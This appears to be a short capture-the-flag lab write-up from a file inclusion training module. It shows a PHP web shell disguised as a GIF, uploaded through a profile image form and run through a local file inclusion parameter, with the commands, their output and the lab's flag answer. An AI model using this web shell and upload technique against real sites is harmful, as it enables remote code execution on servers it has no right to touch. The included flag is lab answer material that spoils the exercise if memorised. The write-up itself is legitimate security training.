# Section 07: LFI and File Uploads

Module: 20. File Inclusion

---

## Questions & Answers

### 1. Use any of the techniques covered in this section to gain RCE and read the flag at /

Context:
- Find the upload functionality at `/settings.php`, create the `shell.gif` and upload the file:
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
- Use the shell:
```
/index.php?language=./profile_images/shell.gif&cmd=id =>  GIF8uid=33(www-data) gid=33(www-data) groups=33(www-data) 
/index.php?language=./profile_images/shell.gif&cmd=ls / =>  GIF82f40d853e2d4768d87da1c81772bae0a.txt bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var 
/index.php?language=./profile_images/shell.gif&cmd=cat /2f40d853e2d4768d87da1c81772bae0a.txt =>  GIF8HTB{upl04d+lf!+3x3cut3=rc3} 
```

**Answer:** `HTB{upl04d+lf!+3x3cut3=rc3}`

---

[Back to Module Index](./README.md)
